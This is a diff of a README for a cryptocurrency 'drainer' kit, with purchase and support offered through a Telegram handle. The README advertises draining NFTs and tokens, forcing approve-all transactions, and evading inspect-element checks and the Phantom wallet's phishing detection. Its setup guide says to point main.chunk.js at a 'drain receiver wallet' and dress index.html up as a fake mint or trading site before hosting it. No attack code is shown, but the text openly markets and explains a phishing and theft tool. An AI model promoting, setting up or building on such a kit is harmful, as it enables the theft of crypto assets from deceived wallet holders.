@@ -7,16 +7,23 @@
 ✅Embed script
 
 ✅Inspect Element Detection
+
 ✅ApproveAll Transaction
+
 ✅No API needed
+
 ✅Custom & Cool Design
+
 ✅Instant transactions
+
 ✅No contract required
+
 ✅Anti Phantom Phishing Detections
+
 ✅NFT + Tokens Drainer
 
 # 📔Setup Guide
-# ❗️Note! It will not work if you havent bought the full code TELEGRAM @paradrainers
+# ❗️Note - It will not work if you havent bought the full code TELEGRAM @paradrainers
 
 You need to edit the main.chunk.js file to your Drain receiver wallet.
 
@@ -24,7 +31,7 @@ You need to edit the main.chunk.js file to your Drain receiver wallet.
 - Open index.html, to edit the project Discord link, Twitter link, how many mints left or total supply and the project name also basically you can change everything and you can design it by yourself it can look like for example (Trading site, Market site).
 -after it you are done, and you just need to host it to any hosting service.
 
-#To get instant support, dm me on TELEGRAM @paradrainers
+# To get instant support, dm me on TELEGRAM @paradrainers
 
 Please ⭐ the repo to support this project & follow for the next updates.
 
